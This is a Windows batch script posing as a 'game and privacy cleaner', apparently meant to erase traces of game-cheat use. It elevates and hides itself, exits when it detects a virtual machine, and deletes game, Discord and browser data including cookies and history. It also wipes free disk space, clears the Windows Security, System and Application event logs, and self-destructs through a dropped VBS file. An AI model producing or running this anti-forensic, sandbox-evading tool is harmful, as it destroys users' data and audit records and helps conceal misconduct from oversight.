@echo off
:: Ultimate Game & Privacy Cleaner v5.1
:: Enhanced with anti-detection, multi-game support, and error handling
:: Compile instructions: Use Bat To Exe Converter (select x64, invisible mode)

:: [Stealth Module v3.1]
if "%1"=="" (
    if exist "%SystemRoot%\Sysnative\cmd.exe" (
        %SystemRoot%\Sysnative\cmd.exe /c "%~f0" stealth
    ) else (
        powershell -window hidden -command "Start-Process cmd -ArgumentList '/c %~f0 stealth' -WindowStyle Hidden -Verb RunAs"
    )
    exit /b
)

:: [Admin Check]
NET FILE >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -command "Start-Process -FilePath '%~f0' -ArgumentList 'stealth' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: [Anti-VM Check v2]
set "VMDetected=0"
for /f "tokens=*" %%a in ('wmic computersystem get manufacturer /value ^| find "Manufacturer="') do (
    set "%%a"
    echo !Manufacturer! | findstr /i "vmware virtualbox qemu xen hyper-v parallel" >nul && set VMDetected=1
)

for /f "tokens=*" %%a in ('wmic bios get serialnumber /value ^| find "SerialNumber="') do (
    set "%%a"
    echo !SerialNumber! | findstr /i "vmware vbox 0000 virtdom" >nul && set VMDetected=1
)

if %VMDetected% equ 1 (
    exit
)

:: [Error Handling Module]
setlocal enabledelayedexpansion

:: [Game Data Cleaning]
:: Minecraft Comprehensive
if exist "%AppData%\.minecraft\" (
    rd /s /q "%AppData%\.minecraft\logs" >nul 2>&1
    del /f /q "%AppData%\.minecraft\*.json" >nul 2>&1
    del /f /q "%AppData%\.minecraft\*.txt" >nul 2>&1
    del /f /q "%AppData%\.minecraft\*.log" >nul 2>&1
    if exist "%AppData%\.minecraft\config\" (
        del /f /q "%AppData%\.minecraft\config\*.json" >nul 2>&1
    )
)

:: TLauncher Deep Clean
if exist "%AppData%\.tlauncher\" (
    rd /s /q "%AppData%\.tlauncher\logs" >nul 2>&1
    del /f /q "%AppData%\.tlauncher\*.dat" >nul 2>&1
    del /f /q "%AppData%\.tlauncher\*.cfg" >nul 2>&1
)

:: Common Game Files
del /f /q "%AppData%\imgui_log.txt" >nul 2>&1
del /f /q "%AppData%\paths.txt" >nul 2>&1
del /f /q "%LocalAppData%\Temp\*.log" >nul 2>&1

:: [Enhanced Browser Cleaning]
call :cleanBrowser "Google\Chrome" "Chrome"
call :cleanBrowser "Microsoft\Edge" "Edge"
call :cleanBrowser "BraveSoftware\Brave-Browser" "Brave"
call :cleanBrowser "Mozilla\Firefox" "Firefox"
call :cleanBrowser "Opera Software\Opera GX" "OperaGX"
call :cleanBrowser "Vivaldi" "Vivaldi"

:: [Discord Token Cleaner v2]
if exist "%AppData%\discord\" (
    if exist "%AppData%\discord\Local Storage\leveldb\" (
        del /f /q "%AppData%\discord\Local Storage\leveldb\*.log" >nul 2>&1
        del /f /q "%AppData%\discord\Local Storage\leveldb\*.ldb" >nul 2>&1
    )
)

:: [Network Anonymization v2]
ipconfig /flushdns >nul 2>&1
netsh winsock reset >nul 2>&1
ipconfig /release >nul 2>&1
timeout /t 3 >nul
ipconfig /renew >nul 2>&1
netsh interface ip delete arpcache >nul 2>&1

:: [Forensic Countermeasures v2]
:: Secure File Shredding with multiple passes
for %%F in (
    "%AppData%\*.log"
    "%AppData%\*.txt"
    "%LocalAppData%\Temp\*.*"
    "%LocalAppData%\Microsoft\Windows\WebCache\*.*"
    "%LocalAppData%\Microsoft\Windows\History\*.*"
) do (
    if exist "%%F" (
        cipher /w:%%F >nul 2>&1
        del /f /q "%%F" >nul 2>&1
    )
)

:: [Game Launcher Cleaner v2]
if exist "%ProgramData%\Epic\" (
    del /f /q "%ProgramData%\Epic\*.log" >nul 2>&1
)
if exist "%LocalAppData%\Riot Games\" (
    del /f /q "%LocalAppData%\Riot Games\*.log" >nul 2>&1
)
if exist "%LocalAppData%\Battle.net\" (
    del /f /q "%LocalAppData%\Battle.net\*.log" >nul 2>&1
)
if exist "%LocalAppData%\Ubisoft Game Launcher\" (
    del /f /q "%LocalAppData%\Ubisoft Game Launcher\*.log" >nul 2>&1
)

:: [New: Steam Cleaner]
if exist "%ProgramFiles(x86)%\Steam\" (
    del /f /q "%ProgramFiles(x86)%\Steam\logs\*.*" >nul 2>&1
    del /f /q "%ProgramFiles(x86)%\Steam\config\*.vdf" >nul 2>&1
)

:: [New: Windows Event Log Cleaner]
if exist "%SystemRoot%\System32\wevtutil.exe" (
    wevtutil cl Application >nul 2>&1
    wevtutil cl System >nul 2>&1
    wevtutil cl Security >nul 2>&1
)

:: [Self-Destruct v4.1]
(
    echo Set obj = CreateObject("Scripting.FileSystemObject")
    echo Set ws = CreateObject("WScript.Shell")
    echo On Error Resume Next
    echo ws.Run "cmd /c timeout /t 3 >nul & del /f /q ""%~f0"" & del /f /q ""%Temp%\cleanup.vbs""", 0, False
    echo obj.DeleteFile(""%Temp%\cleanup.vbs""), True
)>"%Temp%\cleanup.vbs"
start /min wscript.exe "%Temp%\cleanup.vbs"
exit

:: [Enhanced Browser Function v2]
:cleanBrowser
setlocal
set "browser=%~1"
set "alias=%~2"

set "paths=Cache Cache2 Cookies History 'Local Storage' 'Session Storage' IndexedDB 'File System' GPUCache 'Web Data'"

for %%P in (%paths%) do (
    if exist "%LocalAppData%\%browser%\User Data\Default\%%P" (
        rd /s /q "%LocalAppData%\%browser%\User Data\Default\%%P" >nul 2>&1
    )
    
    for /d %%D in ("%LocalAppData%\%browser%\User Data\Profile*") do (
        if exist "%%D\%%P" (
            rd /s /q "%%D\%%P" >nul 2>&1
        )
    )
)

:: Browser-specific cleaning
if "%alias%"=="Brave" (
    if exist "%LocalAppData%\%browser%\User Data\Default\Brave*" (
        del /f /q "%LocalAppData%\%browser%\User Data\Default\Brave*" >nul 2>&1
    )
)

if "%alias%"=="OperaGX" (
    if exist "%LocalAppData%\%browser%\User Data\Default\Opera*" (
        del /f /q "%LocalAppData%\%browser%\User Data\Default\Opera*" >nul 2>&1
    )
)

endlocal
exit /b
